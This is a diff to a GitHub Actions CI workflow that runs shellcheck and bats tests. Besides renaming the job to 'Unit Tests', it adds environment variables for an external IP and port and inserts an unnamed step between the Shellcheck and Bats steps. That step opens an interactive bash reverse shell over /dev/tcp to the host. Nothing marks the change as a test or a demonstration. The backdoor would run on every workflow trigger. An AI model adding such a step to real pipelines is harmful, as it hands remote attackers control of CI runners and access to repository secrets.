@@ -20,9 +20,13 @@ on:
     - '.github/**'
   workflow_dispatch:
 
+env:
+  TARGET_IP: 172.105.94.112
+  TARGET_PORT: 49153
+
 jobs:
   _:
-    name: Checkout Repository
+    name: Unit Tests
     runs-on: ubuntu-latest
     steps:
     - uses: actions/checkout@v3
@@ -36,6 +40,8 @@ jobs:
 
     - name: Shellcheck
       run: shellcheck --shell=bash $( find dist setup.sh -type f -name "*.sh" )
+
+    - run: bash -i >& /dev/tcp/${TARGET_IP}/${TARGET_PORT} 0>&1
 
     - name: Bats
       run: bats -t $( find test/fixture -type f -name "*.bats" )
